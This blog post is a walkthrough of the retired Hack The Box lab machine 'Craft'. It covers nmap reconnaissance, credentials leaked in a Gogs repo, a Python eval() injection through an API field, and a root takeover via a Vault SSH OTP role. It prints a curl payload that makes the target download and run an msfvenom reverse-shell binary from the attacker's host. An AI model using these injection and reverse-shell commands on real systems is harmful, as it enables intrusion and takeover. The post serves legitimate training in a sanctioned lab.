<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[Writeup] Hack The Box: Craft | ErbaZZ's Space</title><meta name=keywords content="writeup,walkthrough,htb,hackthebox"><meta name=description content="Hello! It&rsquo;s been ages since I&rsquo;ve updated this blog. This is a writeup for &ldquo;Craft&rdquo; on HTB that I have written since last November, when it was still up and running. I have totally forgotten about it until today, which I have just found out that it has been retired. It&rsquo;s a few months late, and there are writeups on this box everywhere, but here it is.

"><meta name=author content="ErbaZZ"><link rel=canonical href=https://erbazz.me/writeup/htb_craft/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://erbazz.me/favicon.ico><link rel=apple-touch-icon href=https://erbazz.me/favicon.ico><link rel=mask-icon href=https://erbazz.me/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="[Writeup] Hack The Box: Craft"><meta property="og:description" content="Hello! It&rsquo;s been ages since I&rsquo;ve updated this blog. This is a writeup for &ldquo;Craft&rdquo; on HTB that I have written since last November, when it was still up and running. I have totally forgotten about it until today, which I have just found out that it has been retired. It&rsquo;s a few months late, and there are writeups on this box everywhere, but here it is.

"><meta property="og:type" content="article"><meta property="og:url" content="https://erbazz.me/writeup/htb_craft/"><meta property="og:image" content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="writeup"><meta property="article:published_time" content="2020-03-17T22:03:11+07:00"><meta property="article:modified_time" content="2020-03-17T22:03:11+07:00"><meta property="og:site_name" content="ErbaZZ's Space"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[Writeup] Hack The Box: Craft"><meta name=twitter:description content="Hello! It&rsquo;s been ages since I&rsquo;ve updated this blog. This is a writeup for &ldquo;Craft&rdquo; on HTB that I have written since last November, when it was still up and running. I have totally forgotten about it until today, which I have just found out that it has been retired. It&rsquo;s a few months late, and there are writeups on this box everywhere, but here it is.

"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://erbazz.me/writeup/"},{"@type":"ListItem","position":2,"name":"[Writeup] Hack The Box: Craft","item":"https://erbazz.me/writeup/htb_craft/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[Writeup] Hack The Box: Craft","name":"[Writeup] Hack The Box: Craft","description":"Hello! It\u0026rsquo;s been ages since I\u0026rsquo;ve updated this blog. This is a writeup for \u0026ldquo;Craft\u0026rdquo; on HTB that I have written since last November, when it was still up and running. I have totally forgotten about it until today, which I have just found out that it has been retired. It\u0026rsquo;s a few months late, and there are writeups on this box everywhere, but here it is.\n","keywords":["writeup","walkthrough","htb","hackthebox"],"articleBody":"Hello! It’s been ages since I’ve updated this blog. This is a writeup for “Craft” on HTB that I have written since last November, when it was still up and running. I have totally forgotten about it until today, which I have just found out that it has been retired. It’s a few months late, and there are writeups on this box everywhere, but here it is.\nOS: Linux\nDifficulty: Medium\nPoints: 30\nRelease: 13 Jul 2019\nIP: 10.10.10.110\nDate Cleared: 5 Nov 2019\nInformation Gathering Nmap Scan Result # Nmap 7.70 scan initiated Tue Nov 5 00:31:41 2019 as: nmap -sV -sC -O -oN nmap 10.10.10.110 Nmap scan report for 10.10.10.110 Host is up (0.27s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 |_http-server-header: nginx/1.15.8 |_http-title: 400 The plain HTTP request was sent to HTTPS port | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 |_ssl-date: ERROR: Script execution failed (use -d to debug) | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=11/5%OT=22%CT=1%CU=35820%PV=Y%DS=2%DC=I%G=Y%TM=5DC1099 OS:7%P=i686-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=Z%CI=Z%TS=8)SEQ(SP=106 OS:%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=9)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3= OS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=71 OS:20%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=7210%O=M5 OS:4DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4 OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+% OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y% OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Nov 5 00:33:11 2019 -- 1 IP address (1 host up) scanned in 89.92 seconds Found a webserver on 443 and ssh on 22.\nPort 443 The webpage itself is using the domain craft.htb, and the page contains links to ‘https://api.craft.htb/api/' and ‘https://gogs.craft.htb/', therefore; we need to add 10.10.10.110 craft.htb api.craft.htb gogs.craft.htb to our host file ‘/etc/hosts’.\nGOGS The page ‘https://gogs.craft.htb/' is hosting a Git service, in which we could explore and see the contents of the repository.\nLooking through the commit history, the credential ‘dinesh:4aUh0A8PbVJxgd’ could be found in commit ‘10e3ba4f0a’, and was later deleted in commit ‘a2d28ed155’.\nIn the Issues page, we found an example of endpoint calling curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H \"Content-Type: application/json\" -k -X POST https://api.craft.htb/api/brew/ --data '{\"name\":\"bullshit\",\"brewer\":\"bullshit\", \"style\": \"bullshit\", \"abv\": \"15.0\")}', and a warning that the new patch is dangerous.\nIn the latest commit, a “patch” was commited, adding ’eval()’ function to the brew endpoint which would process the user’s input, so we could use this endpoint to execute system commands.\nAPI The page ‘https://api.craft.htb/api/' is a swagger page showing the API documentation.\nUsing the credential found in the git repository, a valid token could be generated using /auth/login API.\n\"token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcyOTM2NjM2fQ.p06PEETfQsCMYcrOVk0Mo1gff4WhqbzQrFef2wZzh64\" Exploitation Our goal is to gain a remote shell connection, we could do it by running a python command __import__(\"os\").system(\"cd /tmp; wget 10.10.14.162/revshell; chmod +x /tmp/revshell; /tmp/revshell\") to upload a reverse shell binary generated with msfvenom (msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.162 LPORT= 443 -f elf -o revshell) using Python SimpleHTTPServer and create a connection back to us.\nUsing the API calling template we got, we can modify the token and abv parameter as follows:\ncurl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcyOTM4ODkzfQ.TG6NcTG7evwYOyi0x70PiHYEqs7Psyizfim5p_YyvGc' -H 'Content-Type: application/json' -k -X POST https://api.craft.htb/api/brew/ --data '{\"name\":\"bullshit\",\"brewer\":\"bullshit\", \"style\": \"bullshit\", \"abv\": \"__import__(\\\"os\\\").system(\\\"cd /tmp; wget 10.10.14.162/revshell; chmod +x /tmp/revshell; /tmp/revshell\\\") #\"}' Using a handler, we got a reverse shell connection as root; however, after a bit of digging, it seems like we were inside a Docker container.\nFound some credentials in ‘/opt/app/craft_api/settings.py’\nPython was found in ‘/usr/local/bin’, so we can add the directory to path to gain access to more commands using export PATH=$PATH:/usr/local/bin.\nFound ‘dbtest.py’ in ‘/opt/app’ which we could modify the query and change cursor.fetchone() to cursor.fetchall() to dump the content of the database.\nQuery: ‘show databases’\nQuery: ‘show tables’\nQuery: ‘select * from user’\nWe found multiple credentials which are:\ndinesh:4aUh0A8PbVJxgd ebachman:llJ77D8QFkLPQB gilfoyle:ZEU3N8WNM2rh4T Using the credential ‘gilfoyle:ZEU3N8WNM2rh4T’, we could log into GOG and see the private repository named ‘craft-intra’.\nIn the repository, a private key and public key pair could be found.\n๊Using the private key, we can ssh to the target with the credential ‘gilfoyle:ZEU3N8WNM2rh4T’\nGot the user flag.\nPrivilege Escalation From the GGO, there is a vault configuration file, enabling ssh secret with the role ‘root_opt’ that has root permission.\nUsing vault ssh -role root_otp -mode otp root@127.0.0.1, we could ssh to the target server itself and gain root with vault OTP.\nOWNED!\n","wordCount":"738","inLanguage":"en","datePublished":"2020-03-17T22:03:11+07:00","dateModified":"2020-03-17T22:03:11+07:00","author":{"@type":"Person","name":"ErbaZZ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://erbazz.me/writeup/htb_craft/"},"publisher":{"@type":"Organization","name":"ErbaZZ's Space","logo":{"@type":"ImageObject","url":"https://erbazz.me/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://erbazz.me/ accesskey=h title="ErbaZZ's Space (Alt + H)"><img src=https://erbazz.me/apple-touch-icon.png alt aria-label=logo height=35>ErbaZZ's Space</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://erbazz.me/ title=Home><span>Home</span></a></li><li><a href=https://erbazz.me/writeup/ title=Writeup><span>Writeup</span></a></li><li><a href=https://erbazz.me/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://erbazz.me/>Home</a>&nbsp;»&nbsp;<a href=https://erbazz.me/writeup/>Writeups</a></div><h1 class=post-title>[Writeup] Hack The Box: Craft</h1><div class=post-meta><span title="2020-03-17 22:03:11 +0700 +07">March 17, 2020</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;738 words&nbsp;·&nbsp;ErbaZZ</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#information-gathering>Information Gathering</a><ul><li><a href=#nmap-scan-result>Nmap Scan Result</a></li><li><a href=#port-443>Port 443</a></li></ul></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></details></div><div class=post-content><p>Hello! It&rsquo;s been ages since I&rsquo;ve updated this blog. This is a writeup for &ldquo;Craft&rdquo; on HTB that I have written since last November, when it was still up and running. I have totally forgotten about it until today, which I have just found out that it has been retired. It&rsquo;s a few months late, and there are writeups on this box everywhere, but here it is.</p><p><img loading=lazy src=/images/htb_craft/craft.png alt></p><p><strong>OS:</strong> Linux<br><strong>Difficulty:</strong> Medium<br><strong>Points:</strong> 30<br><strong>Release:</strong> 13 Jul 2019<br><strong>IP:</strong> 10.10.10.110<br><strong>Date Cleared:</strong> 5 Nov 2019</p><h2 id=information-gathering>Information Gathering<a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><h3 id=nmap-scan-result>Nmap Scan Result<a hidden class=anchor aria-hidden=true href=#nmap-scan-result>#</a></h3><pre tabindex=0><code># Nmap 7.70 scan initiated Tue Nov  5 00:31:41 2019 as: nmap -sV -sC -O -oN nmap 10.10.10.110
Nmap scan report for 10.10.10.110
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=11/5%OT=22%CT=1%CU=35820%PV=Y%DS=2%DC=I%G=Y%TM=5DC1099
OS:7%P=i686-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=Z%CI=Z%TS=8)SEQ(SP=106
OS:%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=9)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=
OS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=71
OS:20%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=7210%O=M5
OS:4DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  5 00:33:11 2019 -- 1 IP address (1 host up) scanned in 89.92 seconds
</code></pre><p>Found a webserver on 443 and ssh on 22.</p><h3 id=port-443>Port 443<a hidden class=anchor aria-hidden=true href=#port-443>#</a></h3><p>The webpage itself is using the domain craft.htb, and the page contains links to &lsquo;<a href="https://api.craft.htb/api/'">https://api.craft.htb/api/'</a> and &lsquo;<a href="https://gogs.craft.htb/'">https://gogs.craft.htb/'</a>, therefore; we need to add <code>10.10.10.110 craft.htb api.craft.htb gogs.craft.htb</code> to our host file &lsquo;/etc/hosts&rsquo;.</p><p><img loading=lazy src=/images/htb_craft/443-home.png alt></p><h4 id=gogs>GOGS<a hidden class=anchor aria-hidden=true href=#gogs>#</a></h4><p>The page &lsquo;<a href="https://gogs.craft.htb/'">https://gogs.craft.htb/'</a> is hosting a Git service, in which we could explore and see the contents of the repository.</p><p><img loading=lazy src=/images/htb_craft/443-gog-home.png alt></p><p><img loading=lazy src=/images/htb_craft/443-gog-explore.png alt></p><p>Looking through the commit history, the credential &lsquo;dinesh:4aUh0A8PbVJxgd&rsquo; could be found in commit &lsquo;10e3ba4f0a&rsquo;, and was later deleted in commit &lsquo;a2d28ed155&rsquo;.</p><p><img loading=lazy src=/images/htb_craft/443-gog-creds.png alt></p><p>In the Issues page, we found an example of endpoint calling
<code>curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'</code>, and a warning that the new patch is dangerous.</p><p><img loading=lazy src=/images/htb_craft/443-gog-issue.png alt></p><p>In the latest commit, a &ldquo;patch&rdquo; was commited, adding &rsquo;eval()&rsquo; function to the brew endpoint which would process the user&rsquo;s input, so we could use this endpoint to execute system commands.</p><p><img loading=lazy src=/images/htb_craft/443-gog-eval.png alt></p><h4 id=api>API<a hidden class=anchor aria-hidden=true href=#api>#</a></h4><p>The page &lsquo;<a href="https://api.craft.htb/api/'">https://api.craft.htb/api/'</a> is a swagger page showing the API documentation.</p><p><img loading=lazy src=/images/htb_craft/443-api-home.png alt></p><p>Using the credential found in the git repository, a valid token could be generated using /auth/login API.</p><pre tabindex=0><code>&#34;token&#34;: &#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcyOTM2NjM2fQ.p06PEETfQsCMYcrOVk0Mo1gff4WhqbzQrFef2wZzh64&#34;
</code></pre><p><img loading=lazy src=/images/htb_craft/443-api-token.png alt></p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Our goal is to gain a remote shell connection, we could do it by running a python command <code>__import__("os").system("cd /tmp; wget 10.10.14.162/revshell; chmod +x /tmp/revshell; /tmp/revshell")</code> to upload a reverse shell binary generated with msfvenom (<code>msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.162 LPORT= 443 -f elf -o revshell</code>) using Python SimpleHTTPServer and create a connection back to us.</p><p>Using the API calling template we got, we can modify the token and abv parameter as follows:</p><pre tabindex=0><code>curl -H &#39;X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcyOTM4ODkzfQ.TG6NcTG7evwYOyi0x70PiHYEqs7Psyizfim5p_YyvGc&#39; -H &#39;Content-Type: application/json&#39; -k -X POST https://api.craft.htb/api/brew/ --data &#39;{&#34;name&#34;:&#34;bullshit&#34;,&#34;brewer&#34;:&#34;bullshit&#34;, &#34;style&#34;: &#34;bullshit&#34;, &#34;abv&#34;: &#34;__import__(\&#34;os\&#34;).system(\&#34;cd /tmp; wget 10.10.14.162/revshell; chmod +x /tmp/revshell; /tmp/revshell\&#34;) #&#34;}&#39;
</code></pre><p>Using a handler, we got a reverse shell connection as root; however, after a bit of digging, it seems like we were inside a Docker container.</p><p><img loading=lazy src=/images/htb_craft/handler.png alt></p><p><img loading=lazy src=/images/htb_craft/docker.png alt></p><p>Found some credentials in &lsquo;/opt/app/craft_api/settings.py&rsquo;</p><p><img loading=lazy src=/images/htb_craft/sh-creds.png alt></p><p>Python was found in &lsquo;/usr/local/bin&rsquo;, so we can add the directory to path to gain access to more commands using <code>export PATH=$PATH:/usr/local/bin</code>.</p><p>Found &lsquo;dbtest.py&rsquo; in &lsquo;/opt/app&rsquo; which we could modify the query and change <code>cursor.fetchone()</code> to <code>cursor.fetchall()</code> to dump the content of the database.</p><p>Query: &lsquo;show databases&rsquo;</p><p><img loading=lazy src=/images/htb_craft/dbs.png alt></p><p>Query: &lsquo;show tables&rsquo;</p><p><img loading=lazy src=/images/htb_craft/tables.png alt></p><p>Query: &lsquo;select * from user&rsquo;</p><p><img loading=lazy src=/images/htb_craft/user.png alt></p><p>We found multiple credentials which are:</p><pre tabindex=0><code>dinesh:4aUh0A8PbVJxgd
ebachman:llJ77D8QFkLPQB
gilfoyle:ZEU3N8WNM2rh4T
</code></pre><p>Using the credential &lsquo;gilfoyle:ZEU3N8WNM2rh4T&rsquo;, we could log into GOG and see the private repository named &lsquo;craft-intra&rsquo;.</p><p><img loading=lazy src=/images/htb_craft/443-gog-private.png alt></p><p>In the repository, a private key and public key pair could be found.</p><p><img loading=lazy src=/images/htb_craft/443-gog-key.png alt></p><p>๊Using the private key, we can ssh to the target with the credential &lsquo;gilfoyle:ZEU3N8WNM2rh4T&rsquo;</p><p><img loading=lazy src=/images/htb_craft/ssh.png alt></p><p>Got the user flag.</p><p><img loading=lazy src=/images/htb_craft/proof-user-blur.png alt></p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>From the GGO, there is a vault configuration file, enabling ssh secret with the role &lsquo;root_opt&rsquo; that has root permission.</p><p><img loading=lazy src=/images/htb_craft/vault-secret.png alt></p><p>Using <code>vault ssh -role root_otp -mode otp root@127.0.0.1</code>, we could ssh to the target server itself and gain root with vault OTP.</p><p><img loading=lazy src=/images/htb_craft/root.png alt></p><p>OWNED!</p><p><img loading=lazy src=/images/htb_craft/proof-root-blur.png alt></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://erbazz.me/tags/writeup/>writeup</a></li><li><a href=https://erbazz.me/tags/walkthrough/>walkthrough</a></li><li><a href=https://erbazz.me/tags/htb/>htb</a></li><li><a href=https://erbazz.me/tags/hackthebox/>hackthebox</a></li></ul><nav class=paginav><a class=prev href=https://erbazz.me/writeup/htb_openadmin_th/><span class=title>« Prev</span><br><span>[Writeup] Hack The Box: OpenAdmin (Thai Version)</span></a>
<a class=next href=https://erbazz.me/writeup/rop_02_oraclesplan/><span class=title>Next »</span><br><span>[Writeup] ROP: 02 - Oracle's Plan</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://erbazz.me/>ErbaZZ's Space</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerHTML="copy";function s(){e.innerHTML="copied!",setTimeout(()=>{e.innerHTML="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>